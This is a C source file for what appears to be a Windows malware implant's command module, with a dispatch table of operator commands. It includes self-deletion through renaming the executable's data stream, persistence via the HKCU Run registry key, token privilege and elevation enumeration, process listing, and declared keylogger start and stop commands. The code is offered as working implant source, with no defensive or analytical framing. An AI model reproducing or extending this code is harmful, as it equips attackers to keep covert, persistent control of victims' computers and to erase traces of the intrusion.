#include "common.h"

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL pwd(CHAR* input, CHAR** output);
BOOL getprivs(CHAR* input, CHAR** output);
BOOL kill(CHAR* input, CHAR** output);
BOOL stoplogg(CHAR* input, CHAR** output);
BOOL startlogg(CHAR* input, CHAR** output);
BOOL persist(CHAR* input, CHAR** output);
BOOL pslist(CHAR* input, CHAR** output);

const char* funclistNames[NUM_FUNCS] = {
    "pwd",       // 0xAB
    "getprivs",  // 0xAD
    "kill",      // 0xA0
    "stoplogg",
    "startlogg",
    "persist",
    "pslist",
};

// Define corresponding function pointers
BOOL(*funclistPtr[NUM_FUNCS]) (CHAR* input, CHAR** output) = {
    pwd,        // 0xAB
    getprivs,   // 0xAD
    kill,       // 0xA0
    stoplogg,
    startlogg,
    persist,
    pslist,

};

BOOL change_directory(CHAR* input, CHAR** output) {
    // Extract directory from input (e.g., "cd C:\\SomeDirectory")
    CHAR* dir = input + 3; // Skip the "cd " part
    dir = strtok(dir, "\n"); // Remove any trailing newline

    if (SetCurrentDirectoryA(dir)) {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Changed directory to %s\n", dir);
        return TRUE;
    }
    else {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Failed to change directory to %s. Error: %d\n", dir, GetLastError());
        return FALSE;
    }
}

BOOL move_file(const char* source_path, const char* dest_path, char** output) {
    // Attempt to move the file
    if (MoveFileA(source_path, dest_path)) {
        *output = (char*)calloc(BUFFER_SIZE, sizeof(char));
        snprintf(*output, BUFFER_SIZE, "File moved successfully from %s to %s\n", source_path, dest_path);
        return TRUE;
    }
    else {
        *output = (char*)calloc(BUFFER_SIZE, sizeof(char));
        snprintf(*output, BUFFER_SIZE, "Failed to move file. Error: %d\n", GetLastError());
        return FALSE;
    }
}

BOOL pwd(CHAR* input, CHAR** output) {
    CHAR currDir[MAX_PATH];
    DWORD currDirLength = MAX_PATH;
    if (GetCurrentDirectoryA(currDirLength, currDir)) {
        *output = (CHAR*)calloc(strlen(currDir) + 1, sizeof(CHAR));
        strcat_s(*output, strlen(currDir) + 1, currDir);
        return TRUE;
    }
    return FALSE;
}

BOOL kill(CHAR* input, CHAR** output) {
    if (!DeleteSelf()) {

    }
    ExitProcess(0);
}

BOOL DeleteSelf() {


    WCHAR				    szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO	Delete = { 0 };
    HANDLE				    hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO		pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Cleaning up the structures
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

    //--------------------------------------------------------------------------------------------------------------------------
    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
    Delete.DeleteFile = TRUE;

    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
    pRename->FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

    //--------------------------------------------------------------------------------------------------------------------------

    // Used to get the current file name
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //--------------------------------------------------------------------------------------------------------------------------
    // RENAMING

    // Opening a handle to the current file
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

    // Renaming the data stream
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    //--------------------------------------------------------------------------------------------------------------------------
    // DELEING

    // Opening a new handle to the current file
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
        // in case the file is already deleted
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //wprintf(L"[i] DELETING ...");

    // Marking for deletion after the file's handle is closed
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    //wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    //--------------------------------------------------------------------------------------------------------------------------

    // Freeing the allocated buffer
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

BOOL persist(CHAR* input, CHAR** output) {

    //char err[128] = "Failed\n";
    //char succ[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        return -1;
    }
    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT(" deleteme"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        return -1;
    }
    RegCloseKey(NewVal);
    return 0;
}

BOOL getprivs(CHAR* input, CHAR** output) {
    *output = (CHAR*)calloc(10, sizeof(CHAR));
    HANDLE hToken = NULL;
    TOKEN_ELEVATION token_elevation;
    PTOKEN_PRIVILEGES ptoken_privileges = NULL;
    DWORD cbSize = sizeof(TOKEN_ELEVATION);
    DWORD tpSize, length;

    CHAR name[256];

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        GetTokenInformation(hToken, TokenPrivileges, ptoken_privileges, 0, &tpSize);

        ptoken_privileges = (PTOKEN_PRIVILEGES)calloc(tpSize + 1, sizeof(TOKEN_PRIVILEGES));

        if (ptoken_privileges) {
            if (GetTokenInformation(hToken, TokenPrivileges, ptoken_privileges, tpSize, &tpSize)) {
                for (int i = 0; i < ptoken_privileges->PrivilegeCount; i++) {
                    length = 256;
                    LookupPrivilegeNameA(NULL, &ptoken_privileges->Privileges[i].Luid, name, &length);
                    CHAR* t_output = (CHAR*)calloc(strlen(name) + 50, sizeof(CHAR));
                    if (ptoken_privileges->Privileges[i].Attributes == 3) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s => Enabled (Default)\n", name);
                    }
                    else if (ptoken_privileges->Privileges[i].Attributes == 2) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s Enabled (Adjusted)\n", name);
                    }
                    else if (ptoken_privileges->Privileges[i].Attributes == 0) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s Enabled (Disabled)\n", name);
                    }
                    int newOutputlen = strlen(*output) + strlen(t_output) + 1;
                    *output = (CHAR*)realloc(*output, newOutputlen);
                    strcat_s(*output, newOutputlen, t_output);
                    free(t_output);
                }
            }
        }

        if (GetTokenInformation(hToken, TokenElevation, &token_elevation, sizeof(token_elevation), &cbSize)) {
            if (token_elevation.TokenIsElevated) {
                int newOutputlen = strlen(*output) + 14 + 1;
                *output = (CHAR*)realloc(*output, newOutputlen);
                strcat_s(*output, newOutputlen, "[+] Elevated\n");
            }
            else {
                int newOutputlen = strlen(*output) + 16 + 1;
                *output = (CHAR*)realloc(*output, newOutputlen);
                strcat_s(*output, newOutputlen, "[-] Restricted\n");
            }
        }
        CloseHandle(hToken);
    }
    else {
        return FALSE;
    }

    free(ptoken_privileges);
    return TRUE;
}

BOOL pslist(CHAR* input, CHAR** output) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return FALSE; // Failed to take process snapshot
    }

    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    size_t tempBufferSize = 1024; // Initial size for the temporary buffer
    CHAR* tempBuffer = (CHAR*)calloc(tempBufferSize, sizeof(CHAR));
    if (!tempBuffer) {
        CloseHandle(snapshot);
        return FALSE; // Memory allocation failed
    }

    size_t currentLength = 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            // Open the process to retrieve the full path
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processEntry.th32ProcessID);
            if (hProcess) {
                CHAR fullProcessPath[MAX_PATH] = { 0 };
                DWORD pathLength = GetModuleFileNameExA(hProcess, NULL, fullProcessPath, MAX_PATH);

                // If the full path is available, use it; otherwise, fallback to szExeFile
                CHAR* processName = (pathLength > 0) ? fullProcessPath : processEntry.szExeFile;

                // Add process details to the buffer (name, PID, PPID)
                size_t processInfoLength = snprintf(NULL, 0, "%s (PID: %u, PPID: %u)\n",
                    processName,
                    processEntry.th32ProcessID,
                    processEntry.th32ParentProcessID);
                size_t requiredSize = currentLength + processInfoLength;

                // Expand the temporary buffer if needed
                if (requiredSize > tempBufferSize) {
                    tempBufferSize *= 2;
                    if (requiredSize > tempBufferSize) {
                        tempBufferSize = requiredSize; // Ensure it meets the exact requirement
                    }
                    CHAR* newTempBuffer = (CHAR*)realloc(tempBuffer, tempBufferSize);
                    if (!newTempBuffer) {
                        free(tempBuffer);
                        CloseHandle(hProcess);
                        CloseHandle(snapshot);
                        return FALSE; // Memory allocation failed
                    }
                    tempBuffer = newTempBuffer;
                }

                // Append the process info to the buffer
                snprintf(tempBuffer + currentLength, tempBufferSize - currentLength, "%s (PID: %u, PPID: %u)\n",
                    processName,
                    processEntry.th32ProcessID,
                    processEntry.th32ParentProcessID);
                currentLength += processInfoLength; // Update current length

                CloseHandle(hProcess); // Close the process handle
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot); // Clean up the handle

    // Allocate and copy the result to the output
    *output = (CHAR*)calloc(currentLength + 1, sizeof(CHAR));
    if (!*output) {
        free(tempBuffer);
        return FALSE; // Memory allocation failed
    }

    strcpy_s(*output, currentLength + 1, tempBuffer);
    free(tempBuffer); // Free the temporary buffer

    return TRUE;
}